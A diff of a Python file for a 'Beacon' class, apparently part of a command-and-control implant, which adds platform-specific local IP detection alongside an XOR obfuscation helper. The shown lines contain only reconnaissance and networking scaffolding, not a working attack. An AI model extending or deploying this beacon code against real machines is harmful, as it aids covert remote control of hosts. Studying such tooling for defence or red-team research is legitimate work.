@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-import socket,subprocess,time,random,psutil
+import socket,subprocess,time,random,platform,psutil
 from Crypto.Util.strxor import strxor
 
 class Beacon:
@@ -142,14 +142,14 @@ class Beacon:
       return strxor(data,key.encode())
    
    def detect_local_ip(self):
-      addrs = psutil.net_if_addrs()  # Get all network interface addresses
-      for interface, addr_list in addrs.items():
-         for addr in addr_list:
-            if addr.family == socket.AF_INET and not addr.address.startswith("127."):  # Skip loopback
-               self.local_ip = addr.address
-               break
-      if self.local_ip == None:
-         self.local_ip = "127.0.0.1"
+      if platform.system() == "Windows":
+         local_ip = socket.gethostbyname(socket.gethostname())
+         return local_ip
+      elif platform.system() == "Linux":
+         local_ip = subprocess.run("hostname -I",shell=True,capture_output=True,text=True).stdout.strip()
+         return local_ip
+      else:
+         return "Unsupported OS"
 
 def main():
    beacon = Beacon("127.0.0.1",10267)
